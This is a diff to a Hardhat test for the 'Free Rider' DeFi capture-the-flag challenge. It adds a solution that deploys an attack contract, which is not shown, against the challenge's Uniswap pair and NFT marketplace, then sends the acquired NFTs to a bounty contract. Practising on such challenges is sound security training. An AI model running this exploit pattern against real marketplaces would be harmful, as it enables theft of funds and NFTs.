@@ -1,4 +1,4 @@
-// Get compiled Uniswap v2 data
+// Get compiled Uniswap v2 data 
 const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
 const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
 const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");
@@ -10,6 +10,7 @@ const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
 describe('[Challenge] Free Rider', function () {
     let deployer, player, devs;
     let weth, token, uniswapFactory, uniswapRouter, uniswapPair, marketplace, nft, devsContract;
+    let attack;
 
     // The NFT marketplace will have 6 tokens, at 15 ETH each
     const NFT_PRICE = 15n * 10n ** 18n;
@@ -105,7 +106,16 @@ describe('[Challenge] Free Rider', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const abi = ethers.utils.defaultAbiCoder;
+        const data = abi.encode(["address"], [player.address]);
+        const AttackFactory = await ethers.getContractFactory('AttackFR', deployer);
+        attack = await AttackFactory.deploy(uniswapFactory.address,uniswapPair.address,marketplace.address,player.address,nft.address);
+
+        await attack.connect(player).kek();
+
+        for (let id = 0; id < AMOUNT_OF_NFTS; id++) {
+            await nft.connect(player)['safeTransferFrom(address,address,uint256,bytes)'](player.address, devsContract.address, id, data);
+        }
     });
 
     after(async function () {
